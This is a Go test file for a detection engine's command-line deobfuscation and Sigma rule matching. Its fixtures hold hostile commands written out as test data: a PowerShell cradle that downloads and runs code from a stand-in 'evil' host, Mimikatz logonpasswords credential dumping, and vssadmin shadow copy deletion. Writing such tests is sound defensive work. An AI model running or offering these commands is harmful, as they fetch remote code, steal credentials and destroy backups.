package detection

import (
	"encoding/base64"
	"strings"
	"testing"
	"unicode/utf16"
)

// psEncode mimics PowerShell -EncodedCommand: base64 of UTF-16LE.
func psEncode(s string) string {
	u := utf16.Encode([]rune(s))
	b := make([]byte, len(u)*2)
	for i, c := range u {
		b[2*i] = byte(c)
		b[2*i+1] = byte(c >> 8)
	}
	return base64.StdEncoding.EncodeToString(b)
}

func TestDeobfuscateCommandLine(t *testing.T) {
	cases := []struct{ in, want string }{
		{`w^h^o^a^m^i`, `whoami`},                            // caret
		{`w"h"o"a"m"i`, `whoami`},                            // quote insertion
		{"w`h`o`a`m`i", `whoami`},                            // backtick
		{`net   user`, ``},                                   // no obfuscation chars → "" (nothing stripped)
		{`reg add "HKLM\Run" /v x`, `reg add HKLM\Run /v x`}, // quotes removed, spacing kept
	}
	for _, c := range cases {
		if got := deobfuscateCommandLine(c.in); got != c.want {
			t.Errorf("deobfuscateCommandLine(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

func TestDecodeEncodedPowerShell(t *testing.T) {
	payload := `IEX (New-Object Net.WebClient).DownloadString('http://evil/a')`
	cmd := `powershell.exe -nop -w hidden -enc ` + psEncode(payload)
	got := decodeEncodedPowerShell(cmd)
	if !strings.Contains(got, "DownloadString") || !strings.Contains(got, "IEX") {
		t.Errorf("decodeEncodedPowerShell did not recover payload: got %q", got)
	}

	// -EncodedCommand long form.
	cmd2 := `pwsh -EncodedCommand ` + psEncode(payload)
	if got := decodeEncodedPowerShell(cmd2); !strings.Contains(got, "DownloadString") {
		t.Errorf("long-form -EncodedCommand not decoded: got %q", got)
	}

	// Non-encoded command yields nothing.
	if got := decodeEncodedPowerShell(`powershell -Command Get-Process`); got != "" {
		t.Errorf("expected empty decode for plain command, got %q", got)
	}
}

// TestObfuscatedCommandMatchesRule is the end-to-end goal: an obfuscated command that a
// raw substring rule would MISS now fires after the normalization pre-pass.
func TestObfuscatedCommandMatchesRule(t *testing.T) {
	e := NewSigmaEvaluator()
	LoadBuiltinRules(e)

	encPayload := `IEX (New-Object Net.WebClient).DownloadString('http://evil/x.ps1')`

	cases := []struct {
		name, title, image, cmd string
	}{
		{
			// Renamed mimikatz (Image lacks "mimikatz") with caret-obfuscated args; the
			// de-obfuscated CommandLine must trip the sekurlsa content match.
			name:  "caret-obfuscated mimikatz sekurlsa",
			title: "Mimikatz Credential Dumping Tool Detected",
			image: `C:\Tools\m.exe`,
			cmd:   `m.exe "s^e^k^u^r^l^s^a^:^:^l^o^g^o^n^p^a^s^s^w^o^r^d^s"`,
		},
		{
			name:  "quote-obfuscated vssadmin shadow delete",
			title: "Volume Shadow Copy Deletion",
			image: `C:\Windows\system32\vssadmin.exe`,
			cmd:   `vssadmin.exe de"l"e"t"e sha"d"ows /all /quiet`,
		},
		{
			// The decoded payload lands in CommandLine, so the download-cradle rule
			// (CommandLine|contains net.webclient/downloadstring) fires on content that
			// was invisible behind -enc base64.
			name:  "encoded PowerShell download cradle",
			title: "PowerShell Web Download Cradle",
			image: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
			cmd:   `powershell.exe -nop -w hidden -enc ` + psEncode(encPayload),
		},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			env := map[string]any{"type": "process", "data": map[string]any{
				"process": map[string]any{
					"command_line": c.cmd, "image_path": c.image,
					"process_name": c.image, "action": "create",
				},
			}}
			flat := flattenNormalizedEvent(env)
			hit := false
			for _, m := range e.EvaluateEvent(flat) {
				if m.RuleTitle == c.title {
					hit = true
					break
				}
			}
			if !hit {
				t.Errorf("obfuscated command did not match %q\n  cmd=%q\n  normalized=%v",
					c.title, c.cmd, flat["CommandLine"])
			}
		})
	}
}

func TestCollapseConcatenation(t *testing.T) {
	cases := []struct{ in, want string }{
		{`'wh'+'oami'`, `'whoami'`},     // quotes collapsed at the joint; outer remain
		{`"who" + "ami"`, `"whoami"`},   // spaced + and double quotes
		{`'mimi'+'katz'`, `'mimikatz'`}, //
		{`net user`, ``},                // no concatenation → ""
	}
	for _, c := range cases {
		if got := collapseConcatenation(c.in); got != c.want {
			t.Errorf("collapseConcatenation(%q) = %q, want %q", c.in, got, c.want)
		}
	}
	// After the full deobfuscation pass the keyword is recoverable for substring matching.
	if d := deobfuscateCommandLine(collapseConcatenation(`'wh'+'oami'`)); !strings.Contains(d, "whoami") {
		t.Errorf("concat+deobfuscate did not yield whoami: %q", d)
	}
}

func TestDecodeCharCodes(t *testing.T) {
	// [char]0x77,0x68,0x6f,0x61,0x6d,0x69 = "whoami"
	in := `[char]0x77+[char]0x68+[char]0x6f+[char]0x61+[char]0x6d+[char]0x69`
	if got := decodeCharCodes(in); got != "whoami" {
		t.Errorf("decodeCharCodes(hex) = %q, want whoami", got)
	}
	// decimal form
	dec := `[char]105 + [char]101 + [char]120` // "iex"
	if got := decodeCharCodes(dec); got != "iex" {
		t.Errorf("decodeCharCodes(dec) = %q, want iex", got)
	}
	// fewer than 3 casts → no decode (avoids noise)
	if got := decodeCharCodes(`[char]65`); got != "" {
		t.Errorf("single [char] should not decode, got %q", got)
	}
}

// TestDeepObfuscationMatchesRule is the end-to-end goal: a concatenation-obfuscated
// command now matches the underlying rule after the augmented pre-pass.
func TestDeepObfuscationMatchesRule(t *testing.T) {
	e := NewSigmaEvaluator()
	LoadBuiltinRules(e)
	const title = "Mimikatz Credential Dumping Tool Detected"
	env := map[string]any{"type": "process", "data": map[string]any{
		"process": map[string]any{
			"command_line": `m.exe "sek"+"urlsa::logonpasswords"`,
			"image_path":   `C:\Tools\m.exe`, "process_name": "m.exe", "action": "create",
		},
	}}
	flat := flattenNormalizedEvent(env)
	hit := false
	for _, m := range e.EvaluateEvent(flat) {
		if m.RuleTitle == title {
			hit = true
		}
	}
	if !hit {
		t.Errorf("concatenated command did not match %q (normalized=%v)", title, flat["CommandLine"])
	}
}

// TestNormalizeIsIdempotentAndNonDestructive guards the no-regression contract: the
// original substring survives augmentation, and re-running does not re-append.
func TestNormalizeIsIdempotentAndNonDestructive(t *testing.T) {
	flat := map[string]any{"command_line": `w^h^o^a^m^i`}
	normalizeCommandLine(flat)
	first, _ := flat["CommandLine"].(string)
	if !strings.Contains(first, `w^h^o^a^m^i`) {
		t.Errorf("original command line lost after normalize: %q", first)
	}
	if !strings.Contains(first, "whoami") {
		t.Errorf("de-obfuscated form not appended: %q", first)
	}
	normalizeCommandLine(flat)
	if second, _ := flat["CommandLine"].(string); second != first {
		t.Errorf("normalize not idempotent:\n first=%q\nsecond=%q", first, second)
	}
}
